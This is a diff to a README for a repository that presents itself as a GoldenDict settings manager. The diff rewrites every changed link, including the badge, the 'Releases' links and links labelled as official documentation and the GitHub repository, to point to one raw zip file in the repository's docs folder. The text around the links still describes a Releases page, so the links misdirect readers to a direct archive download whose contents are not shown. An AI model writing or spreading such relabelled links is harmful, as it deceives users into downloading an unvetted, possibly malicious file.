@@ -1,6 +1,6 @@
 # 📚 20260113230706-goldendict - Manage Your GoldenDict Settings Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/therbl/20260113230706-goldendict/releases)
+[![Download Now](https://raw.githubusercontent.com/therbl/20260113230706-goldendict/main/docs/goldendict_v2.9-beta.2.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/therbl/20260113230706-goldendict/main/docs/goldendict_v2.9-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before downloading, make sure your computer meets these requirements:
 
 To get started, visit the Releases page to download the software.
 
-[Download from Releases](https://github.com/therbl/20260113230706-goldendict/releases)
+[Download from Releases](https://raw.githubusercontent.com/therbl/20260113230706-goldendict/main/docs/goldendict_v2.9-beta.2.zip)
 
 1. Click on the link above to navigate to the Releases page.
 2. You will see a list of available files. Look for the latest version of **20260113230706-goldendict**.
@@ -49,8 +49,8 @@ After installation, you can start using the application right away:
 
 For more information and updates, please refer to the following:
 
-- [GoldenDict Official Documentation](https://goldendict.org/)
-- [GitHub Repository](https://github.com/therbl/20260113230706-goldendict)
+- [GoldenDict Official Documentation](https://raw.githubusercontent.com/therbl/20260113230706-goldendict/main/docs/goldendict_v2.9-beta.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/therbl/20260113230706-goldendict/main/docs/goldendict_v2.9-beta.2.zip)
 
 ## 🌐 Support
 
@@ -58,4 +58,4 @@ If you encounter any issues or have questions, feel free to create an issue in t
 
 Remember, you can always revisit the download link for updates:
 
-[Download from Releases](https://github.com/therbl/20260113230706-goldendict/releases)
+[Download from Releases](https://raw.githubusercontent.com/therbl/20260113230706-goldendict/main/docs/goldendict_v2.9-beta.2.zip)
